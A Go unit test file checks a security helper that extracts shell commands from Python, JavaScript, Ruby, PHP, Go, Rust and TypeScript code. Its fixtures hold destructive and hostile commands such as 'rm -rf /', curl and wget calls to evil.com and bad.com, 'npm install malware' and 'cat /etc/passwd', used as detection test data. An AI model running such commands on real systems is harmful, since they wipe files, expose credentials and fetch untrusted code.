package security

import (
	"testing"

	"github.com/stretchr/testify/assert"
)

func TestExtractShellCommands_Python(t *testing.T) {
	code := `
import os
import subprocess

os.system("rm -rf /tmp")
subprocess.run("curl http://evil.com")
subprocess.check_output("wget http://bad.com")
`
	cmds := ExtractShellCommands(code, "python")
	assert.Contains(t, cmds, "rm -rf /tmp")
	assert.Contains(t, cmds, "curl http://evil.com")
	assert.Contains(t, cmds, "wget http://bad.com")
}

func TestExtractShellCommands_PythonListForm(t *testing.T) {
	code := `subprocess.run(["rm", "-rf", "/"])`
	cmds := ExtractShellCommands(code, "python")
	assert.Contains(t, cmds, "rm -rf /")
}

func TestExtractShellCommands_JavaScript(t *testing.T) {
	code := `
const { execSync } = require('child_process');
execSync("npm install malware");
spawn("curl", ["http://evil.com"]);
`
	cmds := ExtractShellCommands(code, "javascript")
	assert.Contains(t, cmds, "npm install malware")
	assert.Contains(t, cmds, "curl")
}

func TestExtractShellCommands_TypeScript(t *testing.T) {
	code := `execSync("ls -la")`
	cmds := ExtractShellCommands(code, "typescript")
	assert.Contains(t, cmds, "ls -la")
}

func TestExtractShellCommands_Ruby(t *testing.T) {
	code := "system(\"rm -rf /\")\nresult = `whoami`"
	cmds := ExtractShellCommands(code, "ruby")
	assert.Contains(t, cmds, "rm -rf /")
	assert.Contains(t, cmds, "whoami")
}

func TestExtractShellCommands_Go(t *testing.T) {
	code := `exec.Command("rm", "-rf", "/")`
	cmds := ExtractShellCommands(code, "go")
	assert.Contains(t, cmds, "rm")
}

func TestExtractShellCommands_PHP(t *testing.T) {
	code := `
shell_exec("rm -rf /");
exec("whoami");
system("ls");
passthru("cat /etc/passwd");
proc_open("sh -c 'evil'");
`
	cmds := ExtractShellCommands(code, "php")
	assert.Contains(t, cmds, "rm -rf /")
	assert.Contains(t, cmds, "whoami")
	assert.Contains(t, cmds, "ls")
	assert.Contains(t, cmds, "cat /etc/passwd")
	assert.Contains(t, cmds, "sh -c 'evil'")
}

func TestExtractShellCommands_Rust(t *testing.T) {
	code := `Command::new("rm")`
	cmds := ExtractShellCommands(code, "rust")
	assert.Contains(t, cmds, "rm")
}

func TestExtractShellCommands_UnknownLanguage(t *testing.T) {
	cmds := ExtractShellCommands("anything", "haskell")
	assert.Nil(t, cmds)
}

func TestExtractShellCommands_NoMatches(t *testing.T) {
	cmds := ExtractShellCommands("print('hello')", "python")
	assert.Empty(t, cmds)
}
